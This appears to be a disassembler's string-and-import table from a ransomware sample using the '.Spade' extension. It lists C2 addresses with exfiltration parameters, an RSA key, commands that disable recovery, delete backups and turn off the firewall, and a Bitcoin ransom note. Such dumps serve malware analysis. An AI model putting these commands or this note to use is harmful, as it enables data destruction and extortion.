reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x406355	0x4cce78	string	0x406330	CryptoMaterial: this object does not support precomputation
0x406555	0x4cceb8	string	0x406530	GeneratableCryptoMaterial: this object does not support key/parameter generation
0x4066f0	0x4ccf1c	string	0x406690	AlgorithmParametersBase: parameter "
0x40675a	0x4ccf10	string	0x406690	" not used
0x407310	0x4ccf44	string	0x407240	InputBuffer
0x4073cc	0x4ccf44	string	0x407240	InputBuffer
0x407a70	0x4ccf80	string	0x407a20	InputFileNameWide
0x407a9c	0x4ccf94	string	0x407a20	InputBinaryMode
0x407af0	0x46be3d	string	0x407a20	;\rdqN
0x407c12	0x4ccfb4	string	0x407bb0	OutputFileNameWide
0x407c31	0x4ccfc8	string	0x407bb0	OutputBinaryMode
0x407c79	0x46be3d	string	0x407bb0	;\rdqN
0x4080ff	0x4ccffc	string	0x408010	DecodingLookupArray
0x4081a1	0x4ccff0	string	0x408010	Log2Base
0x408201	0x46be3d	string	0x408010	;\rdqN
0x4084b9	0x4cd084	string	0x408470	/GCM
0x408926	0x4ccfdc	string	0x408920	EncodingParameters
0x408e6a	0x4cd010	string	0x408cc0	InsertLineBreaks
0x408ea1	0x4cd024	string	0x408cc0	MaxLineLength
0x4090ea	0x4cd0b0	string	0x409080	C:\\Windows\
0x409642	0x4cd0e0	string	0x409080	
0x409bca	0x4cd118	string	0x409080	Unhandled exception caught
0x409d94	0x46be3d	string	0x409080	;\rdqN
0x40abb7	0x4cd0e0	string	0x40aa20	
0x40b3ba	0x4cd118	string	0x40aa20	Unhandled exception caught
0x40b58d	0x46be3d	string	0x40aa20	;\rdqN
0x40b677	0x4b8098	import	0x40b5e0	KERNEL32.dll.FindFirstFileW
0x40b688	0x4cd144	string	0x40b5e0	fuck
0x40ba4e	0x4cd164	string	0x40b5e0	IDk.txt
0x40ba65	0x4cd174	string	0x40b5e0	Read-For-Decrypt
0x40bad0	0x4cd0b0	string	0x40b5e0	C:\\Windows\
0x40bc96	0x4b8030	import	0x40b5e0	KERNEL32.dll.lstrcmpW
0x40bcf7	0x4b8054	import	0x40b5e0	KERNEL32.dll.FindNextFileW
0x40bd06	0x4b8018	import	0x40b5e0	KERNEL32.dll.FindClose
0x40c012	0x46be3d	string	0x40b5e0	;\rdqN
0x40c105	0x4b8098	import	0x40c070	KERNEL32.dll.FindFirstFileW
0x40c118	0x4cd144	string	0x40c070	fuck
0x40c524	0x4cd0b0	string	0x40c070	C:\\Windows\
0x40c6ee	0x4cd1a4	string	0x40c070	threaad
0x40c71c	0x4cd1a4	string	0x40c070	threaad
0x40c75a	0x4b8030	import	0x40c070	KERNEL32.dll.lstrcmpW
0x40c7bb	0x4b8054	import	0x40c070	KERNEL32.dll.FindNextFileW
0x40c7ca	0x4b8018	import	0x40c070	KERNEL32.dll.FindClose
0x40cadd	0x46be3d	string	0x40c070	;\rdqN
0x40cbc7	0x4b8098	import	0x40cb30	KERNEL32.dll.FindFirstFileW
0x40cbd8	0x4cd144	string	0x40cb30	fuck
0x40cfda	0x4cd0b0	string	0x40cb30	C:\\Windows\
0x40d1a0	0x4b8030	import	0x40cb30	KERNEL32.dll.lstrcmpW
0x40d201	0x4b8054	import	0x40cb30	KERNEL32.dll.FindNextFileW
0x40d210	0x4b8018	import	0x40cb30	KERNEL32.dll.FindClose
0x40d518	0x46be3d	string	0x40cb30	;\rdqN
0x40d607	0x4b8098	import	0x40d570	KERNEL32.dll.FindFirstFileW
0x40d618	0x4cd144	string	0x40d570	fuck
0x40da1a	0x4cd0b0	string	0x40d570	C:\\Windows\
0x40dbe0	0x4b8030	import	0x40d570	KERNEL32.dll.lstrcmpW
0x40dc41	0x4b8054	import	0x40d570	KERNEL32.dll.FindNextFileW
0x40dc50	0x4b8018	import	0x40d570	KERNEL32.dll.FindClose
0x40df58	0x46be3d	string	0x40d570	;\rdqN
0x40e049	0x4b8098	import	0x40dfb0	KERNEL32.dll.FindFirstFileW
0x40e05a	0x4cd144	string	0x40dfb0	fuck
0x40e3b2	0x4cd0b0	string	0x40dfb0	C:\\Windows\
0x40e581	0x4b8030	import	0x40dfb0	KERNEL32.dll.lstrcmpW
0x40e5e2	0x4b8054	import	0x40dfb0	KERNEL32.dll.FindNextFileW
0x40e5f1	0x4b8018	import	0x40dfb0	KERNEL32.dll.FindClose
0x40e8f9	0x46be3d	string	0x40dfb0	;\rdqN
0x40e9e7	0x4b8098	import	0x40e950	KERNEL32.dll.FindFirstFileW
0x40e9f8	0x4cd144	string	0x40e950	fuck
0x40edfa	0x4cd0b0	string	0x40e950	C:\\Windows\
0x40efae	0x4b8030	import	0x40e950	KERNEL32.dll.lstrcmpW
0x40f00f	0x4b8054	import	0x40e950	KERNEL32.dll.FindNextFileW
0x40f01e	0x4b8018	import	0x40e950	KERNEL32.dll.FindClose
0x40f326	0x46be3d	string	0x40e950	;\rdqN
0x40f417	0x4b8098	import	0x40f380	KERNEL32.dll.FindFirstFileW
0x40f428	0x4cd144	string	0x40f380	fuck
0x40f81d	0x4cd0b0	string	0x40f380	C:\\Windows\
0x40f9d1	0x4b8030	import	0x40f380	KERNEL32.dll.lstrcmpW
0x40fa32	0x4b8054	import	0x40f380	KERNEL32.dll.FindNextFileW
0x40fa41	0x4b8018	import	0x40f380	KERNEL32.dll.FindClose
0x40fd49	0x46be3d	string	0x40f380	;\rdqN
0x40fded	0x4b80a0	import	0x40fda0	KERNEL32.dll.GetLogicalDrives
0x40fed3	0x46be3d	string	0x40fda0	;\rdqN
0x40ff42	0x4cd1ac	string	0x40fee0	sqlserver.exe
0x40ff8a	0x4cd1bc	string	0x40fee0	msftesql.exe
0x40ffcf	0x4cd1cc	string	0x40fee0	sqlagent.exe
0x410014	0x4cd1dc	string	0x40fee0	sqlbrowser.exe
0x41004d	0x4cd1ec	string	0x40fee0	sqlwriter.exe
0x410083	0x4cd1fc	string	0x40fee0	mysqld.exe
0x4100b6	0x4cd208	string	0x40fee0	mysqld-nt.exe
0x4100e9	0x4cd220	string	0x40fee0	mysqld-opt.exe
0x410124	0x4b8028	import	0x40fee0	KERNEL32.dll.CloseHandle
0x41013d	0x4b8020	import	0x40fee0	KERNEL32.dll.CreateToolhelp32Snapshot
0x410157	0x4b8094	import	0x40fee0	KERNEL32.dll.Process32First
0x4101b4	0x4b801c	import	0x40fee0	KERNEL32.dll.OpenProcess
0x4101c3	0x4b8010	import	0x40fee0	KERNEL32.dll.TerminateProcess
0x4101ca	0x4b8028	import	0x40fee0	KERNEL32.dll.CloseHandle
0x4101da	0x4b8024	import	0x40fee0	KERNEL32.dll.Process32Next
0x4101e5	0x4b8028	import	0x40fee0	KERNEL32.dll.CloseHandle
0x4101f3	0x4b8024	import	0x40fee0	KERNEL32.dll.Process32Next
0x410262	0x46be3d	string	0x40fee0	;\rdqN
0x410334	0x4b8098	import	0x4102a0	KERNEL32.dll.FindFirstFileW
0x410347	0x4cd144	string	0x4102a0	fuck
0x410515	0x4b8030	import	0x4102a0	KERNEL32.dll.lstrcmpW
0x41053b	0x4cd230	string	0x4102a0	\Read-For-Decrypt.HTA
0x4105e3	0x4cd25c	string	0x4102a0	error
0x41066a	0x4b8054	import	0x4102a0	KERNEL32.dll.FindNextFileW
0x410679	0x4b8018	import	0x4102a0	KERNEL32.dll.FindClose
0x410984	0x46be3d	string	0x4102a0	;\rdqN
0x410a57	0x4b8098	import	0x4109c0	KERNEL32.dll.FindFirstFileW
0x410a68	0x4cd144	string	0x4109c0	fuck
0x410e3b	0x4cd164	string	0x4109c0	IDk.txt
0x410e4e	0x4cd174	string	0x4109c0	Read-For-Decrypt
0x410ea6	0x4cd0b0	string	0x4109c0	C:\\Windows\
0x41106c	0x4b8030	import	0x4109c0	KERNEL32.dll.lstrcmpW
0x4110cd	0x4b8054	import	0x4109c0	KERNEL32.dll.FindNextFileW
0x4110dc	0x4b8018	import	0x4109c0	KERNEL32.dll.FindClose
0x4113e4	0x46be3d	string	0x4109c0	;\rdqN
0x4114d9	0x4b8098	import	0x411440	KERNEL32.dll.FindFirstFileW
0x4114ea	0x4cd144	string	0x411440	fuck
0x411839	0x4cd0b0	string	0x411440	C:\\Windows\
0x411a03	0x4b8030	import	0x411440	KERNEL32.dll.lstrcmpW
0x411a64	0x4b8054	import	0x411440	KERNEL32.dll.FindNextFileW
0x411a73	0x4b8018	import	0x411440	KERNEL32.dll.FindClose
0x411d82	0x46be3d	string	0x411440	;\rdqN
0x411e2b	0x4cd290	string	0x411dd0	0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNMQWERTYUIOPASDFGHJKLZXCVBNM
0x411efa	0x46be3d	string	0x411dd0	;\rdqN
0x411f8c	0x4cd2ec	string	0x411f10	active
0x411fa0	0x4cd2f4	string	0x411f10	detive
0x4120ef	0x4cd300	string	0x411f10	172.98.203.175
0x412183	0x4cd310	string	0x411f10	/new
0x4123c1	0x4cd318	string	0x411f10	/1614CEEEC50A9336EBF690886CAA747D6811C45D37086A3FA7B11C9E83926C6C
0x412469	0x4cd360	string	0x411f10	From
0x412568	0x4cd388	string	0x411f10	&ip=
0x412580	0x4cd380	string	0x411f10	&disk=
0x4125b4	0x4cd378	string	0x411f10	&key=
0x4125e5	0x4cd370	string	0x411f10	&id=
0x412616	0x4cd368	string	0x411f10	&mail=
0x412fb4	0x4cd390	string	0x411f10	172.98.203.178
0x413048	0x4cd310	string	0x411f10	/new
0x413282	0x4cd318	string	0x411f10	/1614CEEEC50A9336EBF690886CAA747D6811C45D37086A3FA7B11C9E83926C6C
0x413330	0x4cd360	string	0x411f10	From
0x41343b	0x4cd388	string	0x411f10	&ip=
0x413453	0x4cd380	string	0x411f10	&disk=
0x413487	0x4cd378	string	0x411f10	&key=
0x4134b8	0x4cd370	string	0x411f10	&id=
0x4134e9	0x4cd368	string	0x411f10	&mail=
0x41398c	0x46be3d	string	0x411f10	;\rdqN
0x41401c	0x4cd45c	string	0x413f40	C:\ProgramData\IDktxt
0x41408a	0x4cd474	string	0x413f40	C:\ProgramData\pubk.txt
0x414258	0x4cd474	string	0x413f40	C:\ProgramData\pubk.txt
0x41428e	0x4ccf70	string	0x413f40	InputFileName
0x4142ad	0x4ccf94	string	0x413f40	InputBinaryMode
0x41447f	0x4cd4a4	string	0x413f40	C:\ProgramData
0x4145f1	0x4cd264	string	0x413f40	0123456789QWERTYUIOPASDFGHJKLZXCVBNM
0x41478a	0x4cd48c	string	0x413f40	C:\ProgramData\IDk.txt
0x414c54	0x4cd474	string	0x413f40	C:\ProgramData\pubk.txt
0x414c87	0x4ccfa4	string	0x413f40	OutputFileName
0x414ca6	0x4ccfc8	string	0x413f40	OutputBinaryMode
0x414d79	0x4cd2ec	string	0x413f40	active
0x414e29	0x4cd474	string	0x413f40	C:\ProgramData\pubk.txt
0x414e3b	0x4cd4b8	string	0x413f40	MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEAz1fUejNDmOsXyWZA/sg7teoFsJ5c7koSybvGZsuYQX01KlYHJ1QYc+7uQfncLRG9ZSX3+PoiNvLxdXxnzpW//CeaiHsWDxidFnpsSBts5UPWWAFlydl4b7LplgR2L16Xg1dD4DykQxB4zIWnyEkhAotYaROBn9z8lkqa6x3F7mVxS1ZSgG111qk3MN5vMUio7tSE1aMmsRZSOb68tUkCvVOuLJ7B/20y/Fp+ocjKT72sSUWvRaJDPQJnVtyqwP8ZPZF3uA+TWCJXXJ2DBRnfUd7dd5B3G6/jYOEnvuWtZvc7ntUUhXnOIcLbNyKuMlxI3wjJD2dSbWRW4f1PowinkQIBEQ==
0x414e5b	0x4cd474	string	0x413f40	C:\ProgramData\pubk.txt
0x4152fb	0x46be3d	string	0x413f40	;\rdqN
0x4158c8	0x4b802c	import	0x415880	KERNEL32.dll.FreeConsole
0x41591d	0x4cd660	string	0x415880	TheFlash@tutamail.com
0x415967	0x4cd678	string	0x415880	TheFlash@cock.email
0x4159ac	0x4cd6a0	string	0x415880	.Spade
0x415a3c	0x4cd6a8	string	0x415880	net stop SQLWriter
0x415a46	0x4cd6bc	string	0x415880	net stop SQLBrowser
0x415a50	0x4cd6d0	string	0x415880	net stop MSSQLSERVER
0x415a5a	0x4cd6e8	string	0x415880	net stop MSSQL$CONTOSO1
0x415a64	0x4cd700	string	0x415880	net stop MSDTC
0x415a6e	0x4cd710	string	0x415880	bcdedit /set {default} bootstatuspolicy ignoreallfailures
0x415a78	0x4cd74c	string	0x415880	bcdedit /set {default} recoveryenabled no
0x415a82	0x4cd778	string	0x415880	wbadmin delete catalog -quiet
0x415a8c	0x4cd798	string	0x415880	net stop SQLSERVERAGENT
0x415a96	0x4cd6d0	string	0x415880	net stop MSSQLSERVER
0x415aa0	0x4cd7b0	string	0x415880	net stop vds
0x415aaa	0x4cd7c0	string	0x415880	netsh advfirewall set currentprofile state off
0x415ab4	0x4cd7f0	string	0x415880	netsh firewall set opmode mode=disable
0x415b35	0x4b8014	import	0x415880	KERNEL32.dll.GetDriveTypeA
0x415d12	0x46c7a0	string	0x415880	WVS3
0x415d20	0x46c7a0	string	0x415880	WVS3
0x415f5d	0x4cd8b0	string	0x415880	<html><head><meta http-equiv='X-UA-Compatible' content='IE=8' /><script type='text/javascript'> window.resizeTo(window.screen.width,window.screen.height);</script> <style> body { background-color: #f7f5ff;text-align: center; } #d1{ background-color: #9c91ff; width: 90%; height: 190px; margin: auto; text-align: center; border-radius: 13px; margin-top=30px; font-size: 14pt; padding-top: 10px; font-weight: bold; } #d2{ background-color: #9c91ff; width: 90%; height: 150px; margin: auto; margin-top: 30px; text-align: center; border-radius: 13px; font-size: 14pt; padding-top: 40px; font-weight: bold; } #d3{ background-color: #9c91ff; width: 90%; height: 150px; margin: auto; margin-top: 30px; text-align: center; border-radius: 13px; font-size: 14pt; padding-top: 30px; font-weight: bold; } </style> <title>lock</title></head><body><h1 id='h1'>Your Files Has Been Encrypted</h1><div id='d1'>All Your Files , Documents , photos , Databases and other important files are encrypted <br/>And have Extention .Spade <br/> If You Need Your Files You Have To Pay<br/> You can Send 1 Little File Less Than 2MB for Test (The Test Files Should not be Databases Large Excel Sheets or Backups <br/> After 24 Hour Decryption Price Will be Doubled so You Better Contact us as soon as possible<br> Using Recovery Tools or 3rd Party Applications is useless you can try tough</div><div id='d2'> <br>1- Contact Email on Files And Send ID on The Files Then Do agreement on a Price</br>2- Send Some Files for Decryption Test ( Dont Pay to Anyone Else who is Not Able to Decrypt Your Test Files!) <br>After Geting Test Files Pay The price in Bitcoin And Get Decryption Tool + RSA key</br></div><div id='d
0x415f94	0x4cd884	string	0x415880	<br/>our Email :
0x41605c	0x4cd844	string	0x415880	<br/>In Case Of No Answer :
0x416127	0x4cd818	string	0x415880	</div></body></html>
0x4163e9	0x4b8014	import	0x415880	KERNEL32.dll.GetDriveTypeA
0x4167e3	0x4b8014	import	0x415880	KERNEL32.dll.GetDriveTypeA
0x4168e0	0x4cd118	string	0x415880	Unhandled exception caught
0x416a2b	0x4b8014	import	0x415880	KERNEL32.dll.GetDriveTypeA
0x416c45	0x4cd474	string	0x415880	C:\ProgramData\pubk.txt
0x416c4f	0x4cd48c	string	0x415880	C:\ProgramData\IDk.txt
0x417165	0x46be3d	string	0x415880	;\rdqN
0x417a4f	0x417a59	string	0x4179d0	3ɉHP blocks=Basic Latin,Latin Extended-B
0x417a7e	0x417a88	string	0x4179d0	3ɉHP blocks=Basic Latin,Latin Extended-B
0x4184f6	0x418506	string	0x418480	3ɉJP blocks=Basic Latin,Latin Extended-B
0x4184fc	0x418506	string	0x418480	3ɉJP blocks=Basic Latin,Latin Extended-B
0x41854f	0x41855f	string	0x418480	3ɉJP blocks=Basic Latin,Latin Extended-B
0x418555	0x41855f	string	0x418480	3ɉJP blocks=Basic Latin,Latin Extended-B
0x4185e2	0x4ccf50	string	0x4185b0	SHA-1
0x418957	0x4ce8cc	string	0x418920	OutputStringPointer
0x419977	0x419989	string	0x4198c0	3ۋE\b blocks=Basic Latin,Arabic
0x41a293	0x41a297	string	0x41a270	WPRQ
0x41a3a6	0x46be3d	string	0x41a2d0	;\rdqN
0x41a4af	0x46be3d	string	0x41a3c0	;\rdqN
0x41a725	0x48f102	string	0x41a690	j\fhxSN
0x41a93d	0x46be3d	string	0x41a690	;\rdqN
0x41aa8a	0x46be3d	string	0x41aa60	;\rdqN
0x41aac8	0x46be3d	string	0x41aa60	;\rdqN
0x41ab2b	0x46be3d	string	0x41aa60	;\rdqN
0x41abbe	0x46be3d	string	0x41aa60	;\rdqN
0x41b776	0x4cd48c	string	0x41b680	C:\ProgramData\IDk.txt
0x41b964	0x46be3d	string	0x41b890	;\rdqN
0x41ba7c	0x46be3d	string	0x41b970	;\rdqN
0x41c09a	0x46be3d	string	0x41be10	;\rdqN
0x41c1c5	0x46be3d	string	0x41c1a0	;\rdqN
0x41c201	0x46be3d	string	0x41c1a0	;\rdqN
0x41c242	0x48c9b5	string	0x41c1a0	j\fhPRN
0x41c25c	0x46be3d	string	0x41c1a0	;\rdqN
0x41c2bb	0x46be3d	string	0x41c1a0	;\rdqN
0x41c2fe	0x46be3d	string	0x41c1a0	;\rdqN
0x41c8ac	0x41c8b6	string	0x41c850	3ɉHP blocks=Basic Latin,Latin Extended-B
0x41c8de	0x41c8e8	string	0x41c850	3ɉHP blocks=Basic Latin,Latin Extended-B
0x41d823	0x41d833	string	0x41d7d0	3ɉJP blocks=Basic Latin,Latin Extended-B
0x41d829	0x41d833	string	0x41d7d0	3ɉJP blocks=Basic Latin,Latin Extended-B
0x41da96	0x46be3d	string	0x41da00	;\rdqN
0x41dcec	0x46be3d	string	0x41dc90	;\rdqN
0x41dead	0x46be3d	string	0x41dd00	;\rdqN
0x41e06d	0x46be3d	string	0x41dec0	;\rdqN
0x41e0f0	0x46be3d	string	0x41e080	;\rdqN
0x41e170	0x46be3d	string	0x41e100	;\rdqN
0x41e1ed	0x46be3d	string	0x41e180	;\rdqN
0x41e26d	0x46be3d	string	0x41e200	;\rdqN
0x41e584	0x46be3d	string	0x41e280	;\rdqN
0x41e8e1	0x4ce96c	string	0x41e8a0	BufferedTransformation: this object doesn't allow input
0x41ea81	0x4ce96c	string	0x41ea40	BufferedTransformation: this object doesn't allow input
0x41f42e	0x46be3d	string	0x41f3c0	;\rdqN
0x41f466	0x46be3d	string	0x41f3c0	;\rdqN
0x41f478	0x46be3d	string	0x41f3c0	;\rdqN
0x41f9d2	0x46be3d	string	0x41f970	;\rdqN
0x41fa0a	0x46be3d	string	0x41f970	;\rdqN
0x41fa1c	0x46be3d	string	0x41f970	;\rdqN
0x41fb16	0x46be3d	string	0x41fa30	;\rdqN
0x420340	0x4ce9a4	string	0x420340	vector<T> too long
0x420963	0x46be3d	string	0x420510	;\rdqN
0x420eb7	0x46be3d	string	0x420a10	;\rdqN
0x42100c	0x4cd08c	string	0x420fa0	MGF1
0x421032	0x4ccf50	string	0x420fa0	SHA-1
0x421260	0x4cea10	string	0x421260	invalid string position
0x42158d	0x46be3d	string	0x4214d0	;\rdqN
0x421888	0x421878	string	0x421860	;P\bu\r
0x421c03	0x46be3d	string	0x421a20	;\rdqN
0x421dfa	0x46be3d	string	0x421c10	;\rdqN
0x4225aa	0x46be3d	string	0x422430	;\rdqN
0x4226b4	0x46be3d	string	0x4225c0	;\rdqN
0x422811	0x46be3d	string	0x4226e0	;\rdqN
0x422951	0x46be3d	string	0x422820	;\rdqN
0x42299b	0x4ccf58	string	0x422960	FeedbackSize
0x4229c0	0x46be3d	string	0x422960	;\rdqN
0x422b02	0x46be3d	string	0x4229d0	;\rdqN
0x423029	0x4cd198	string	0x422f20	shit
0x4231ed	0x46be3d	string	0x423140	;\rdqN
0x4232c2	0x4cd474	string	0x423280	C:\ProgramData\pubk.txt
0x423352	0x4cd4a4	string	0x423310	C:\ProgramData
0x42367e	0x46be3d	string	0x423470	;\rdqN
0x4238cc	0x46be3d	string	0x4236d0	;\rdqN
0x42447c	0x46be3d	string	0x4242d0	;\rdqN
0x424649	0x46be3d	string	0x424490	;\rdqN
0x424838	0x46be3d	string	0x424660	;\rdqN
0x425264	0x46be3d	string	0x425050	;\rdqN
0x425680	0x4cea28	string	0x425680	string too long
0x426055	0x4ccbf8	string	0x425f60	false
0x42606b	0x4ccc00	string	0x425f60	true
0x426108	0x46be3d	string	0x425f60	;\rdqN
0x42638a	0x46be3d	string	0x426140	;\rdqN
0x4265d6	0x46be3d	string	0x4264a0	;\rdqN
0x4266de	0x46be3d	string	0x4265f0	;\rdqN
0x4267df	0x46be3d	string	0x4266f0	;\rdqN
0x426c48	0x46be3d	string	0x426bb0	;\rdqN
0x426cf5	0x46be3d	string	0x426c60	;\rdqN
0x426dc8	0x46be3d	string	0x426d00	;\rdqN
0x4270c5	0x46be3d	string	0x426ff0	;\rdqN
0x4271a2	0x46be3d	string	0x4270d0	;\rdqN
0x427776	0x46be3d	string	0x4275a0	;\rdqN
0x42795c	0x46be3d	string	0x427780	;\rdqN
0x428534	0x4b8278	import	0x428510	WS2_32.dll.socket
0x428545	0x4b8468	string	0x428510	Failed to create socket
0x42859b	0x4b827c	import	0x428510	WS2_32.dll.setsockopt
0x4285a6	0x4b8480	string	0x428510	all your TCP packets will be buffered
0x4285ab	0x4b84a8	string	0x428510	Failed to set socket option "TCP_NODELAY" ;
0x4285c8	0x4b827c	import	0x428510	WS2_32.dll.setsockopt
0x4285d3	0x4b84d8	string	0x428510	Failed to enable broadcast on UDP socket
0x428769	0x4b8270	import	0x428760	WS2_32.dll.htonl
0x4287f7	0x4b8504	string	0x4287c0	www.sfml-dev.org
0x4288bf	0x4b8518	string	0x4287c0	/ip-provider.php
0x428bdf	0x46be3d	string	0x4287c0	;\rdqN
0x428dad	0x4b852c	string	0x428da0	255.255.255.255
0x428ddb	0x4b853c	string	0x428da0	0.0.0.0
0x428df8	0x4b826c	import	0x428da0	WS2_32.dll.inet_addr
0x428e3d	0x4b8260	import	0x428da0	WS2_32.dll.getaddrinfo
0x428e55	0x4b825c	import	0x428da0	WS2_32.dll.freeaddrinfo
0x428e72	0x4b8264	import	0x428e70	WS2_32.dll.ntohl
0x428e87	0x4b8268	import	0x428e80	WS2_32.dll.inet_ntoa
0x4297af	0x46be3d	string	0x429440	;\rdqN
0x429ece	0x429ee0	string	0x429e60	_^[]
0x42a91b	0x42a950	string	0x42a850	;K\fs
0x42b584	0x46be3d	string	0x42b030	;\rdqN
0x42b6ab	0x4ccbf8	string	0x42b5b0	false
0x42b6d9	0x4ccc00	string	0x42b5b0	true
0x42b866	0x4b87bc	string	0x42b740	0123456789-+Ee
0x42c3c5	0x46be3d	string	0x42b740	;\rdqN
0x42c4dd	0x4b87e8	string	0x42c3e0	0123456789ABCDEFabcdef-+XxPp
0x42d09f	0x46be3d	string	0x42c3e0	;\rdqN
0x42d136	0x4b87cc	string	0x42d0b0	0123456789ABCDEFabcdef-+Xx
0x42d5a6	0x46be3d	string	0x42d0b0	;\rdqN
0x42daa5	0x46be3d	string	0x42d5c0	;\rdqN
0x42dd27	0x46be3d	string	0x42dbf0	;\rdqN
0x42de5b	0x46be3d	string	0x42dd40	;\rdqN
0x42df7e	0x46be3d	string	0x42de70	;\rdqN
0x42e09e	0x46be3d	string	0x42df90	;\rdqN
0x42e218	0x46be3d	string	0x42e0b0	;\rdqN
0x42e38f	0x46be3d	string	0x42e230	;\rdqN
0x42e563	0x46be3d	string	0x42e3a0	;\rdqN
0x42e676	0x46be3d	string	0x42e570	;\rdqN
0x42e7a8	0x46be3d	string	0x42e690	;\rdqN
0x42e8d8	0x46be3d	string	0x42e7c0	;\rdqN
0x42eba6	0x46be3d	string	0x42e8f0	;\rdqN
0x42ec72	0x46be3d	string	0x42ec10	;\rdqN
0x42ece2	0x46be3d	string	0x42ec80	;\rdqN
0x42ee9a	0x46be3d	string	0x42ecf0	;\rdqN
0x42f05a	0x46be3d	string	0x42eeb0	;\rdqN
0x42f0c2	0x46be3d	string	0x42f070	;\rdqN
0x42f135	0x46be3d	string	0x42f0d0	;\rdqN
0x42f1a5	0x46be3d	string	0x42f140	;\rdqN
0x42f378	0x46be3d	string	0x42f1b0	;\rdqN
0x42f4a2	0x46be3d	string	0x42f3f0	;\rdqN
0x42f89f	0x4b8634	string	0x42f7f0	http/
0x42f9c3	0x4b8644	string	0x42f7f0	transfer-encoding
0x42fae4	0x4b863c	string	0x42f7f0	chunked
0x42ff22	0x46be3d	string	0x42f7f0	;\rdqN
0x430495	0x46be3d	string	0x42ffb0	;\rdqN
0x430615	0x4b85f4	string	0x430510	POST
0x43061e	0x4b85fc	string	0x430510	HEAD
